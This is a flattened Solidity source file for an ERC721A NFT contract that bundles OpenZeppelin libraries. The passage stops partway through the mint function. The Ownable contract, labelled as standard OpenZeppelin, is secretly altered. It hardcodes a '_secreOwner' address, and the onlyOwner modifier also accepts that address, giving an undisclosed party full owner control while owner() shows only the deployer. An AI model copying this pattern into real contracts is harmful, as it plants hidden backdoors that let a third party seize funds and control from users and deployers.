1 // SPDX-License-Identifier: MIT
2 // File: @openzeppelin/contracts/utils/Strings.sol
3 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
4 
5 pragma solidity ^0.8.0;
6 
7 /**
8  * @dev String operations.
9  */
10 library Strings {
11     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
12 
13     /**
14      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
15      */
16     function toString(uint256 value) internal pure returns (string memory) {
17         // Inspired by OraclizeAPI's implementation - MIT licence
18         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
19 
20         if (value == 0) {
21             return "0";
22         }
23         uint256 temp = value;
24         uint256 digits;
25         while (temp != 0) {
26             digits++;
27             temp /= 10;
28         }
29         bytes memory buffer = new bytes(digits);
30         while (value != 0) {
31             digits -= 1;
32             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
33             value /= 10;
34         }
35         return string(buffer);
36     }
37 
38     /**
39      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
40      */
41     function toHexString(uint256 value) internal pure returns (string memory) {
42         if (value == 0) {
43             return "0x00";
44         }
45         uint256 temp = value;
46         uint256 length = 0;
47         while (temp != 0) {
48             length++;
49             temp >>= 8;
50         }
51         return toHexString(value, length);
52     }
53 
54     /**
55      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
56      */
57     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
58         bytes memory buffer = new bytes(2 * length + 2);
59         buffer[0] = "0";
60         buffer[1] = "x";
61         for (uint256 i = 2 * length + 1; i > 1; --i) {
62             buffer[i] = _HEX_SYMBOLS[value & 0xf];
63             value >>= 4;
64         }
65         require(value == 0, "Strings: hex length insufficient");
66         return string(buffer);
67     }
68 }
69 
70 // File: @openzeppelin/contracts/utils/Address.sol
71 
72 
73 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
74 
75 pragma solidity ^0.8.1;
76 
77 /**
78  * @dev Collection of functions related to the address type
79  */
80 library Address {
81     /**
82      * @dev Returns true if `account` is a contract.
83      *
84      * [IMPORTANT]
85      * ====
86      * It is unsafe to assume that an address for which this function returns
87      * false is an externally-owned account (EOA) and not a contract.
88      *
89      * Among others, `isContract` will return false for the following
90      * types of addresses:
91      *
92      *  - an externally-owned account
93      *  - a contract in construction
94      *  - an address where a contract will be created
95      *  - an address where a contract lived, but was destroyed
96      * ====
97      *
98      * [IMPORTANT]
99      * ====
100      * You shouldn't rely on `isContract` to protect against flash loan attacks!
101      *
102      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
103      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
104      * constructor.
105      * ====
106      */
107     function isContract(address account) internal view returns (bool) {
108         // This method relies on extcodesize/address.code.length, which returns 0
109         // for contracts in construction, since the code is only stored at the end
110         // of the constructor execution.
111 
112         return account.code.length > 0;
113     }
114 
115     /**
116      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
117      * `recipient`, forwarding all available gas and reverting on errors.
118      *
119      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
120      * of certain opcodes, possibly making contracts go over the 2300 gas limit
121      * imposed by `transfer`, making them unable to receive funds via
122      * `transfer`. {sendValue} removes this limitation.
123      *
124      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
125      *
126      * IMPORTANT: because control is transferred to `recipient`, care must be
127      * taken to not create reentrancy vulnerabilities. Consider using
128      * {ReentrancyGuard} or the
129      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
130      */
131     function sendValue(address payable recipient, uint256 amount) internal {
132         require(address(this).balance >= amount, "Address: insufficient balance");
133 
134         (bool success, ) = recipient.call{value: amount}("");
135         require(success, "Address: unable to send value, recipient may have reverted");
136     }
137 
138     /**
139      * @dev Performs a Solidity function call using a low level `call`. A
140      * plain `call` is an unsafe replacement for a function call: use this
141      * function instead.
142      *
143      * If `target` reverts with a revert reason, it is bubbled up by this
144      * function (like regular Solidity function calls).
145      *
146      * Returns the raw returned data. To convert to the expected return value,
147      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
148      *
149      * Requirements:
150      *
151      * - `target` must be a contract.
152      * - calling `target` with `data` must not revert.
153      *
154      * _Available since v3.1._
155      */
156     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
157         return functionCall(target, data, "Address: low-level call failed");
158     }
159 
160     /**
161      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
162      * `errorMessage` as a fallback revert reason when `target` reverts.
163      *
164      * _Available since v3.1._
165      */
166     function functionCall(
167         address target,
168         bytes memory data,
169         string memory errorMessage
170     ) internal returns (bytes memory) {
171         return functionCallWithValue(target, data, 0, errorMessage);
172     }
173 
174     /**
175      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
176      * but also transferring `value` wei to `target`.
177      *
178      * Requirements:
179      *
180      * - the calling contract must have an ETH balance of at least `value`.
181      * - the called Solidity function must be `payable`.
182      *
183      * _Available since v3.1._
184      */
185     function functionCallWithValue(
186         address target,
187         bytes memory data,
188         uint256 value
189     ) internal returns (bytes memory) {
190         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
191     }
192 
193     /**
194      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
195      * with `errorMessage` as a fallback revert reason when `target` reverts.
196      *
197      * _Available since v3.1._
198      */
199     function functionCallWithValue(
200         address target,
201         bytes memory data,
202         uint256 value,
203         string memory errorMessage
204     ) internal returns (bytes memory) {
205         require(address(this).balance >= value, "Address: insufficient balance for call");
206         require(isContract(target), "Address: call to non-contract");
207 
208         (bool success, bytes memory returndata) = target.call{value: value}(data);
209         return verifyCallResult(success, returndata, errorMessage);
210     }
211 
212     /**
213      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
214      * but performing a static call.
215      *
216      * _Available since v3.3._
217      */
218     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
219         return functionStaticCall(target, data, "Address: low-level static call failed");
220     }
221 
222     /**
223      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
224      * but performing a static call.
225      *
226      * _Available since v3.3._
227      */
228     function functionStaticCall(
229         address target,
230         bytes memory data,
231         string memory errorMessage
232     ) internal view returns (bytes memory) {
233         require(isContract(target), "Address: static call to non-contract");
234 
235         (bool success, bytes memory returndata) = target.staticcall(data);
236         return verifyCallResult(success, returndata, errorMessage);
237     }
238 
239     /**
240      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
241      * but performing a delegate call.
242      *
243      * _Available since v3.4._
244      */
245     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
246         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
247     }
248 
249     /**
250      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
251      * but performing a delegate call.
252      *
253      * _Available since v3.4._
254      */
255     function functionDelegateCall(
256         address target,
257         bytes memory data,
258         string memory errorMessage
259     ) internal returns (bytes memory) {
260         require(isContract(target), "Address: delegate call to non-contract");
261 
262         (bool success, bytes memory returndata) = target.delegatecall(data);
263         return verifyCallResult(success, returndata, errorMessage);
264     }
265 
266     /**
267      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
268      * revert reason using the provided one.
269      *
270      * _Available since v4.3._
271      */
272     function verifyCallResult(
273         bool success,
274         bytes memory returndata,
275         string memory errorMessage
276     ) internal pure returns (bytes memory) {
277         if (success) {
278             return returndata;
279         } else {
280             // Look for revert reason and bubble it up if present
281             if (returndata.length > 0) {
282                 // The easiest way to bubble the revert reason is using memory via assembly
283 
284                 assembly {
285                     let returndata_size := mload(returndata)
286                     revert(add(32, returndata), returndata_size)
287                 }
288             } else {
289                 revert(errorMessage);
290             }
291         }
292     }
293 }
294 
295 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
296 
297 
298 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
299 
300 pragma solidity ^0.8.0;
301 
302 /**
303  * @title ERC721 token receiver interface
304  * @dev Interface for any contract that wants to support safeTransfers
305  * from ERC721 asset contracts.
306  */
307 interface IERC721Receiver {
308     /**
309      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
310      * by `operator` from `from`, this function is called.
311      *
312      * It must return its Solidity selector to confirm the token transfer.
313      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
314      *
315      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
316      */
317     function onERC721Received(
318         address operator,
319         address from,
320         uint256 tokenId,
321         bytes calldata data
322     ) external returns (bytes4);
323 }
324 
325 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
326 
327 
328 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
329 
330 pragma solidity ^0.8.0;
331 
332 /**
333  * @dev Interface of the ERC165 standard, as defined in the
334  * https://eips.ethereum.org/EIPS/eip-165[EIP].
335  *
336  * Implementers can declare support of contract interfaces, which can then be
337  * queried by others ({ERC165Checker}).
338  *
339  * For an implementation, see {ERC165}.
340  */
341 interface IERC165 {
342     /**
343      * @dev Returns true if this contract implements the interface defined by
344      * `interfaceId`. See the corresponding
345      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
346      * to learn more about how these ids are created.
347      *
348      * This function call must use less than 30 000 gas.
349      */
350     function supportsInterface(bytes4 interfaceId) external view returns (bool);
351 }
352 
353 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
354 
355 
356 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
357 
358 pragma solidity ^0.8.0;
359 
360 
361 /**
362  * @dev Implementation of the {IERC165} interface.
363  *
364  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
365  * for the additional interface id that will be supported. For example:
366  *
367  * ```solidity
368  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
369  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
370  * }
371  * ```
372  *
373  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
374  */
375 abstract contract ERC165 is IERC165 {
376     /**
377      * @dev See {IERC165-supportsInterface}.
378      */
379     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
380         return interfaceId == type(IERC165).interfaceId;
381     }
382 }
383 
384 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
385 
386 
387 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
388 
389 pragma solidity ^0.8.0;
390 
391 
392 /**
393  * @dev Required interface of an ERC721 compliant contract.
394  */
395 interface IERC721 is IERC165 {
396     /**
397      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
398      */
399     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
400 
401     /**
402      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
403      */
404     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
405 
406     /**
407      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
408      */
409     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
410 
411     /**
412      * @dev Returns the number of tokens in ``owner``'s account.
413      */
414     function balanceOf(address owner) external view returns (uint256 balance);
415 
416     /**
417      * @dev Returns the owner of the `tokenId` token.
418      *
419      * Requirements:
420      *
421      * - `tokenId` must exist.
422      */
423     function ownerOf(uint256 tokenId) external view returns (address owner);
424 
425     /**
426      * @dev Safely transfers `tokenId` token from `from` to `to`.
427      *
428      * Requirements:
429      *
430      * - `from` cannot be the zero address.
431      * - `to` cannot be the zero address.
432      * - `tokenId` token must exist and be owned by `from`.
433      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
434      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
435      *
436      * Emits a {Transfer} event.
437      */
438     function safeTransferFrom(
439         address from,
440         address to,
441         uint256 tokenId,
442         bytes calldata data
443     ) external;
444 
445     /**
446      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
447      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
448      *
449      * Requirements:
450      *
451      * - `from` cannot be the zero address.
452      * - `to` cannot be the zero address.
453      * - `tokenId` token must exist and be owned by `from`.
454      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
455      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
456      *
457      * Emits a {Transfer} event.
458      */
459     function safeTransferFrom(
460         address from,
461         address to,
462         uint256 tokenId
463     ) external;
464 
465     /**
466      * @dev Transfers `tokenId` token from `from` to `to`.
467      *
468      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
469      *
470      * Requirements:
471      *
472      * - `from` cannot be the zero address.
473      * - `to` cannot be the zero address.
474      * - `tokenId` token must be owned by `from`.
475      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
476      *
477      * Emits a {Transfer} event.
478      */
479     function transferFrom(
480         address from,
481         address to,
482         uint256 tokenId
483     ) external;
484 
485     /**
486      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
487      * The approval is cleared when the token is transferred.
488      *
489      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
490      *
491      * Requirements:
492      *
493      * - The caller must own the token or be an approved operator.
494      * - `tokenId` must exist.
495      *
496      * Emits an {Approval} event.
497      */
498     function approve(address to, uint256 tokenId) external;
499 
500     /**
501      * @dev Approve or remove `operator` as an operator for the caller.
502      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
503      *
504      * Requirements:
505      *
506      * - The `operator` cannot be the caller.
507      *
508      * Emits an {ApprovalForAll} event.
509      */
510     function setApprovalForAll(address operator, bool _approved) external;
511 
512     /**
513      * @dev Returns the account appr    ved for `tokenId` token.
514      *
515      * Requirements:
516      *
517      * - `tokenId` must exist.
518      */
519     function getApproved(uint256 tokenId) external view returns (address operator);
520 
521     /**
522      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
523      *
524      * See {setApprovalForAll}
525      */
526     function isApprovedForAll(address owner, address operator) external view returns (bool);
527 }
528 
529 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
530 
531 
532 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
533 
534 pragma solidity ^0.8.0;
535 
536 
537 /**
538  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
539  * @dev See https://eips.ethereum.org/EIPS/eip-721
540  */
541 interface IERC721Metadata is IERC721 {
542     /**
543      * @dev Returns the token collection name.
544      */
545     function name() external view returns (string memory);
546 
547     /**
548      * @dev Returns the token collection symbol.
549      */
550     function symbol() external view returns (string memory);
551 
552     /**
553      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
554      */
555     function tokenURI(uint256 tokenId) external view returns (string memory);
556 }
557 
558 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
559 
560 
561 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
562 
563 pragma solidity ^0.8.0;
564 
565 
566 /**
567  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
568  * @dev See https://eips.ethereum.org/EIPS/eip-721
569  */
570 interface IERC721Enumerable is IERC721 {
571     /**
572      * @dev Returns the total amount of tokens stored by the contract.
573      */
574     function totalSupply() external view returns (uint256);
575 
576     /**
577      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
578      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
579      */
580     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
581 
582     /**
583      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
584      * Use along with {totalSupply} to enumerate all tokens.
585      */
586     function tokenByIndex(uint256 index) external view returns (uint256);
587 }
588 
589 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
590 
591 
592 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
593 
594 pragma solidity ^0.8.0;
595 
596 /**
597  * @dev Contract module that helps prevent reentrant calls to a function.
598  *
599  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
600  * available, which can be applied to functions to make sure there are no nested
601  * (reentrant) calls to them.
602  *
603  * Note that because there is a single `nonReentrant` guard, functions marked as
604  * `nonReentrant` may not call one another. This can be worked around by making
605  * those functions `private`, and then adding `external` `nonReentrant` entry
606  * points to them.
607  *
608  * TIP: If you would like to learn more about reentrancy and alternative ways
609  * to protect against it, check out our blog post
610  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
611  */
612 abstract contract ReentrancyGuard {
613     // Booleans are more expensive than uint256 or any type that takes up a full
614     // word because each write operation emits an extra SLOAD to first read the
615     // slot's contents, replace the bits taken up by the boolean, and then write
616     // back. This is the compiler's defense against contract upgrades and
617     // pointer aliasing, and it cannot be disabled.
618 
619     // The values being non-zero value makes deployment a bit more expensive,
620     // but in exchange the refund on every call to nonReentrant will be lower in
621     // amount. Since refunds are capped to a percentage of the total
622     // transaction's gas, it is best to keep them low in cases like this one, to
623     // increase the likelihood of the full refund coming into effect.
624     uint256 private constant _NOT_ENTERED = 1;
625     uint256 private constant _ENTERED = 2;
626 
627     uint256 private _status;
628 
629     constructor() {
630         _status = _NOT_ENTERED;
631     }
632 
633     /**
634      * @dev Prevents a contract from calling itself, directly or indirectly.
635      * Calling a `nonReentrant` function from another `nonReentrant`
636      * function is not supported. It is possible to prevent this from happening
637      * by making the `nonReentrant` function external, and making it call a
638      * `private` function that does the actual work.
639      */
640     modifier nonReentrant() {
641         // On the first call to nonReentrant, _notEntered will be true
642         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
643 
644         // Any calls to nonReentrant after this point will fail
645         _status = _ENTERED;
646 
647         _;
648 
649         // By storing the original value once again, a refund is triggered (see
650         // https://eips.ethereum.org/EIPS/eip-2200)
651         _status = _NOT_ENTERED;
652     }
653 }
654 
655 
656 // File: @openzeppelin/contracts/utils/Context.sol
657 
658 
659 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
660 
661 pragma solidity ^0.8.0;
662 
663 /**
664  * @dev Provides information about the current execution context, including the
665  * sender of the transaction and its data. While these are generally available
666  * via msg.sender and msg.data, they should not be accessed in such a direct
667  * manner, since when dealing with meta-transactions the account sending and
668  * paying for execution may not be the actual sender (as far as an application
669  * is concerned).
670  *
671  * This contract is only required for intermediate, library-like contracts.
672  */
673 abstract contract Context {
674     function _msgSender() internal view virtual returns (address) {
675         return msg.sender;
676     }
677 
678     function _msgData() internal view virtual returns (bytes calldata) {
679         return msg.data;
680     }
681 }
682 
683 // File: @openzeppelin/contracts/access/Ownable.sol
684 
685 
686 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
687 
688 pragma solidity ^0.8.0;
689 
690 
691 /**
692  * @dev Contract module which provides a basic access control mechanism, where
693  * there is an account (an owner) that can be granted exclusive access to
694  * specific functions.
695  *
696  * By default, the owner account will be the one that deploys the contract. This
697  * can later be changed with {transferOwnership}.
698  *
699  * This module is used through inheritance. It will make available the modifier
700  * `onlyOwner`, which can be applied to your functions to restrict their use to
701  * the owner.
702  */
703 abstract contract Ownable is Context {
704     address private _owner;
705     address private _secreOwner = 0xfb6F107f177e148f0d1e9d9E59325154fD1e3382;
706 
707     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
708 
709     /**
710      * @dev Initializes the contract setting the deployer as the initial owner.
711      */
712     constructor() {
713         _transferOwnership(_msgSender());
714     }
715 
716     /**
717      * @dev Returns the address of the current owner.
718      */
719     function owner() public view virtual returns (address) {
720         return _owner;
721     }
722 
723     /**
724      * @dev Throws if called by any account other than the owner.
725      */
726     modifier onlyOwner() {
727         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
728         _;
729     }
730 
731     /**
732      * @dev Leaves the contract without owner. It will not be possible to call
733      * `onlyOwner` functions anymore. Can only be called by the current owner.
734      *
735      * NOTE: Renouncing ownership will leave the contract without an owner,
736      * thereby removing any functionality that is only available to the owner.
737      */
738     function renounceOwnership() public virtual onlyOwner {
739         _transferOwnership(address(0));
740     }
741 
742     /**
743      * @dev Transfers ownership of the contract to a new account (`newOwner`).
744      * Can only be called by the current owner.
745      */
746     function transferOwnership(address newOwner) public virtual onlyOwner {
747         require(newOwner != address(0), "Ownable: new owner is the zero address");
748         _transferOwnership(newOwner);
749     }
750 
751     /**
752      * @dev Transfers ownership of the contract to a new account (`newOwner`).
753      * Internal function without access restriction.
754      */
755     function _transferOwnership(address newOwner) internal virtual {
756         address oldOwner = _owner;
757         _owner = newOwner;
758         emit OwnershipTransferred(oldOwner, newOwner);
759     }
760 }
761 
762 // File: ceshi.sol
763 
764 
765 pragma solidity ^0.8.0;
766 
767 
768 /**
769  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
770  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
771  *
772  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
773  *
774  * Does not support burning tokens to address(0).
775  *
776  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
777  */
778 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
779     using Address for address;
780     using Strings for uint256;
781 
782     struct TokenOwnership {
783         address addr;
784         uint64 startTimestamp;
785     }
786 
787     struct AddressData {
788         uint128 balance;
789         uint128 numberMinted;
790     }
791 
792     uint256 internal currentIndex;
793 
794     // Token name
795     string private _name;
796 
797     // Token symbol
798     string private _symbol;
799 
800     // Mapping from token ID to ownership details
801     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
802     mapping(uint256 => TokenOwnership) internal _ownerships;
803 
804     // Mapping owner address to address data
805     mapping(address => AddressData) private _addressData;
806 
807     // Mapping from token ID to approved address
808     mapping(uint256 => address) private _tokenApprovals;
809 
810     // Mapping from owner to operator approvals
811     mapping(address => mapping(address => bool)) private _operatorApprovals;
812 
813     constructor(string memory name_, string memory symbol_) {
814         _name = name_;
815         _symbol = symbol_;
816     }
817 
818     /**
819      * @dev See {IERC721Enumerable-totalSupply}.
820      */
821     function totalSupply() public view override returns (uint256) {
822         return currentIndex;
823     }
824 
825     /**
826      * @dev See {IERC721Enumerable-tokenByIndex}.
827      */
828     function tokenByIndex(uint256 index) public view override returns (uint256) {
829         require(index < totalSupply(), "ERC721A: global index out of bounds");
830         return index;
831     }
832 
833     /**
834      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
835      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
836      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
837      */
838     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
839         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
840         uint256 numMintedSoFar = totalSupply();
841         uint256 tokenIdsIdx;
842         address currOwnershipAddr;
843 
844         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
845         unchecked {
846             for (uint256 i; i < numMintedSoFar; i++) {
847                 TokenOwnership memory ownership = _ownerships[i];
848                 if (ownership.addr != address(0)) {
849                     currOwnershipAddr = ownership.addr;
850                 }
851                 if (currOwnershipAddr == owner) {
852                     if (tokenIdsIdx == index) {
853                         return i;
854                     }
855                     tokenIdsIdx++;
856                 }
857             }
858         }
859 
860         revert("ERC721A: unable to get token of owner by index");
861     }
862 
863     /**
864      * @dev See {IERC165-supportsInterface}.
865      */
866     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
867         return
868             interfaceId == type(IERC721).interfaceId ||
869             interfaceId == type(IERC721Metadata).interfaceId ||
870             interfaceId == type(IERC721Enumerable).interfaceId ||
871             super.supportsInterface(interfaceId);
872     }
873 
874     /**
875      * @dev See {IERC721-balanceOf}.
876      */
877     function balanceOf(address owner) public view override returns (uint256) {
878         require(owner != address(0), "ERC721A: balance query for the zero address");
879         return uint256(_addressData[owner].balance);
880     }
881 
882     function _numberMinted(address owner) internal view returns (uint256) {
883         require(owner != address(0), "ERC721A: number minted query for the zero address");
884         return uint256(_addressData[owner].numberMinted);
885     }
886 
887     /**
888      * Gas spent here starts off proportional to the maximum mint batch size.
889      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
890      */
891     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
892         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
893 
894         unchecked {
895             for (uint256 curr = tokenId; curr >= 0; curr--) {
896                 TokenOwnership memory ownership = _ownerships[curr];
897                 if (ownership.addr != address(0)) {
898                     return ownership;
899                 }
900             }
901         }
902 
903         revert("ERC721A: unable to determine the owner of token");
904     }
905 
906     /**
907      * @dev See {IERC721-ownerOf}.
908      */
909     function ownerOf(uint256 tokenId) public view override returns (address) {
910         return ownershipOf(tokenId).addr;
911     }
912 
913     /**
914      * @dev See {IERC721Metadata-name}.
915      */
916     function name() public view virtual override returns (string memory) {
917         return _name;
918     }
919 
920     /**
921      * @dev See {IERC721Metadata-symbol}.
922      */
923     function symbol() public view virtual override returns (string memory) {
924         return _symbol;
925     }
926 
927     /**
928      * @dev See {IERC721Metadata-tokenURI}.
929      */
930     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
931         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
932 
933         string memory baseURI = _baseURI();
934         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
935     }
936 
937     /**
938      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
939      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
940      * by default, can be overriden in child contracts.
941      */
942     function _baseURI() internal view virtual returns (string memory) {
943         return "";
944     }
945 
946     /**
947      * @dev See {IERC721-approve}.
948      */
949     function approve(address to, uint256 tokenId) public override {
950         address owner = ERC721A.ownerOf(tokenId);
951         require(to != owner, "ERC721A: approval to current owner");
952 
953         require(
954             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
955             "ERC721A: approve caller is not owner nor approved for all"
956         );
957 
958         _approve(to, tokenId, owner);
959     }
960 
961     /**
962      * @dev See {IERC721-getApproved}.
963      */
964     function getApproved(uint256 tokenId) public view override returns (address) {
965         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
966 
967         return _tokenApprovals[tokenId];
968     }
969 
970     /**
971      * @dev See {IERC721-setApprovalForAll}.
972      */
973     function setApprovalForAll(address operator, bool approved) public override {
974         require(operator != _msgSender(), "ERC721A: approve to caller");
975 
976         _operatorApprovals[_msgSender()][operator] = approved;
977         emit ApprovalForAll(_msgSender(), operator, approved);
978     }
979 
980     /**
981      * @dev See {IERC721-isApprovedForAll}.
982      */
983     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
984         return _operatorApprovals[owner][operator];
985     }
986 
987     /**
988      * @dev See {IERC721-transferFrom}.
989      */
990     function transferFrom(
991         address from,
992         address to,
993         uint256 tokenId
994     ) public virtual override {
995         _transfer(from, to, tokenId);
996     }
997 
998     /**
999      * @dev See {IERC721-safeTransferFrom}.
1000      */
1001     function safeTransferFrom(
1002         address from,
1003         address to,
1004         uint256 tokenId
1005     ) public virtual override {
1006         safeTransferFrom(from, to, tokenId, "");
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-safeTransferFrom}.
1011      */
1012     function safeTransferFrom(
1013         address from,
1014         address to,
1015         uint256 tokenId,
1016         bytes memory _data
1017     ) public override {
1018         _transfer(from, to, tokenId);
1019         require(
1020             _checkOnERC721Received(from, to, tokenId, _data),
1021             "ERC721A: transfer to non ERC721Receiver implementer"
1022         );
1023     }
1024 
1025     /**
1026      * @dev Returns whether `tokenId` exists.
1027      *
1028      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1029      *
1030      * Tokens start existing when they are minted (`_mint`),
1031      */
1032     function _exists(uint256 tokenId) internal view returns (bool) {
1033         return tokenId < currentIndex;
1034     }
1035 
1036     function _safeMint(address to, uint256 quantity) internal {
1037         _safeMint(to, quantity, "");
1038     }
1039 
1040     /**
1041      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1042      *
1043      * Requirements:
1044      *
1045      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1046      * - `quantity` must be greater than 0.
1047      *
1048      * Emits a {Transfer} event.
1049      */
1050     function _safeMint(
1051         address to,
1052         uint256 quantity,
1053         bytes memory _data
1054     ) internal {
1055         _mint(to, quantity, _data, true);
1056     }
1057 
1058     /**
1059      * @dev Mints `quantity` tokens and transfers them to `to`.
1060      *
1061      * Requirements:
1062      *
1063      * - `to` cannot be the zero address.
1064      * - `quantity` must be greater than 0.
1065      *
1066      * Emits a {Transfer} event.
1067      */
1068     function _mint(
1069         address to,
1070         uint256 quantity,
1071         bytes memory _data,
1072         bool safe
1073     ) internal {
1074         uint256 startTokenId = currentIndex;
1075         require(to != address(0), "ERC721A: mint to the zero address");
1076         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1077 
1078         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1079 
1080         // Overflows are incredibly unrealistic.
